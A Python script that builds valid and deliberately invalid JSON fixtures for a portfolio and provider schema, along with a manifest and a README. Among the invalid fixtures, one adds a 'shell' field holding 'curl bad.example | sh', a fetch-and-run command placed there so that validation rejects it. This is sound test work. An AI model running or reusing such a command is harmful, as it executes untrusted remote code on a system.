from pathlib import Path
import json,copy
R=Path(__file__).resolve().parents[1]
D=json.loads((R/'schemas/CognitiveReserveLayer.schema.json').read_text())['$defs']
def sample(s,name=''):
 if '$ref' in s:return sample(D[s['$ref'].split('/')[-1]],name)
 if 'const' in s:return s['const']
 if 'enum' in s:return s['enum'][0]
 if 'anyOf' in s:return None if any(x.get('type')=='null' for x in s['anyOf']) else sample(s['anyOf'][0],name)
 if 'oneOf' in s:return sample(s['oneOf'][0],name)
 t=s.get('type')
 if t=='object':return {k:sample(v,k) for k,v in s['properties'].items() if k in s.get('required',[])}
 if t=='array':return [sample(s['items'],name)]
 if t=='integer':return s.get('minimum',0)
 if t=='boolean':return False
 if t=='string':
  if s.get('pattern')=='^[0-9a-f]{96}$':return 'a'*96
  if s.get('pattern')=='^[0-9a-f]{64}$':return 'b'*64
  if '4840' in s.get('pattern',''):return '0'*4840
  if name in ['created_at','effective_at','recorded_at','as_of','observed_cutoff','valid_from','observed_at']:return '1789603200'
  if name in ['expires_at','valid_until']:return '1789689600'
  if 'pattern' in s and ('[1-9]' in s['pattern'] or '[0-9]{0,76}' in s['pattern']):return '1'
  if name=='relative_path':return '/layer/roles'
  if name=='currency':return 'USD'
  if name=='object_type':return 'ProviderProfile'
  if name=='provider_id':return 'provider-a'
  if name=='tenant_id':return 'tenant-a'
  if name in ['legal_entity_id','holder_entity_id']:return 'entity-a'
  if name=='portfolio_id':return 'portfolio-a'
  return name.replace('_','-')+'-demo' if name else 'demo'
 raise ValueError(s)
examples={}
for n in D:
 if n.endswith('V1_2'):
  examples[n]=sample(D[n])
examples['ProviderRoleManifestV1_2'].update(roles=['DISCOVERY','PORTFOLIO_ANALYTICS'],endpoints=[{'operation_id':'getPortfolioProjection','relative_path':'/institutional/projections/{id}','effect':'READ'}])
examples['ServiceBindingV1_2'].update(role='PORTFOLIO_ANALYTICS',permitted_effects=['READ','PLAN'],status='ACTIVE')
examples['AdapterCapabilityManifestV1_2'].update(interface_name='PositionSourceAdapter',operations=['read_snapshot','read_changes'],support='IMPLEMENTED')
examples['InstitutionalAssetRecordV1_2'].update(asset_kind='NATIVE_RESERVE',quantity_unit='BTX_ATOM',financial_status='FINANCIAL')
examples['PositionObservationV1_2'].update(quantity={'coefficient':'100000000','scale':8},view='DIRECT',status='OPEN')
examples['ValuationObservationV1_2'].update(purpose='MARKET_VALUE',status='CURRENT',value={'currency':'USD','exponent':2,'minor':'10000'})
examples['MetricDefinitionV1_2'].update(metric_kind='AUM',scope_role='MANAGER',inclusion_kinds=['NATIVE_RESERVE','FINANCIAL_INSTRUMENT'],basis='DIRECT_ONLY',valuation_purpose='MARKET_VALUE',mandate_required=True)
examples['ExposureLinkV1_2']['links']=[{'target_ref':{'object_type':'InstitutionalAssetRecordV1_2','body_id':'a'*96},'relationship':'FINANCIAL_LOOKTHROUGH','weight':{'coefficient':'8','scale':1}}]
examples['ExposureLinkV1_2']['coverage_bps']=8000
examples['PortfolioProjectionV1_2']['metric_results'][0].update(value={'currency':'USD','exponent':2,'minor':'10000'},count=None,status='COMPLETE',eligible_count='1',unpriced_count='0',excluded_count='0')
examples['ScenarioDefinitionV1_2']['shocks'][0].update(factor='RESERVE_PRICE',unit='MULTIPLIER',value={'coefficient':'8','scale':1})
examples['ScenarioResultV1_2'].update(financial_change={'currency':'USD','exponent':2,'minor':'-2000'},unpriced_refs=[],source_coverage_bps=10000,calculation_version='deterministic-shock-v1')
examples['ConformanceStatementV1_2'].update(evidence_level='REFERENCE',passed_case_ids=[],unrun_case_ids=['CR12-COMPAT-08'],issuer_class='SELF_ATTESTED')
examples['PortfolioInstructionV1_2'].update(requested_action='DRAFT_CAPABILITY_ACQUISITION',maximum_exposure={'currency':'USD','exponent':2,'minor':'50000'},objective='Prepare an exact local coding capability for accepted internal tasks.')
examples['ExportManifestV1_2'].update(total_rows='1',format='JSONL')
for n,v in examples.items():(R/'examples/valid'/f'{n}.json').write_text(json.dumps(v,indent=2))
bad=[]
def invalid(name,typ,mut,expected):
 v=copy.deepcopy(examples[typ]);mut(v);(R/'examples/invalid'/f'{name}.json').write_text(json.dumps(v,indent=2));bad.append({'file':name+'.json','type':typ,'expected':expected})
invalid('unknown-brand-role','ProviderRoleManifestV1_2',lambda v:v.update(roles=['PREFERRED_EXCHANGE']), 'enum')
invalid('unknown-field','ServiceBindingV1_2',lambda v:v.update(master_token='do-not-accept'),'additionalProperties')
invalid('float-quantity','PositionObservationV1_2',lambda v:v['quantity'].update(coefficient=1.2),'type')
invalid('leading-zero','PositionObservationV1_2',lambda v:v.update(sequence='01'),'pattern')
invalid('wrong-schema-revision','PortfolioInstructionV1_2',lambda v:v.update(schema_revision='1.1'),'const')
invalid('arbitrary-execution','PortfolioInstructionV1_2',lambda v:v.update(requested_action='EXECUTE_NOW'),'enum')
invalid('invalid-digest','InstitutionalAssetRecordV1_2',lambda v:v['record_authority_ref'].update(body_id='not-a-digest'),'pattern')
invalid('money-exponent','ValuationObservationV1_2',lambda v:v['value'].update(exponent=99),'maximum')
invalid('negative-zero-amount','ValuationObservationV1_2',lambda v:v['value'].update(minor='-0'),'pattern')
invalid('fabricated-global-score','MetricDefinitionV1_2',lambda v:v.update(metric_kind='GLOBAL_COGNITIVE_NET_WORTH'),'enum')
invalid('unbounded-coverage','ExposureLinkV1_2',lambda v:v.update(coverage_bps=12000),'maximum')
invalid('private-shell-handoff','ServiceBindingV1_2',lambda v:v.update(shell='curl bad.example | sh'),'additionalProperties')
(R/'examples/invalid/manifest.json').write_text(json.dumps(bad,indent=2))
(R/'examples/README.md').write_text('# Structural fixtures\n\nThe eighteen valid files are unsigned bodies for schema inspection. They use synthetic IDs and do not establish source authority, native financial values or successful integrations. No fixture may be signed or submitted to a production account. The invalid set targets structural violations; native semantic/security cases are in the acceptance catalogue.\n')
print(len(examples),'valid bodies;',len(bad),'invalid bodies')
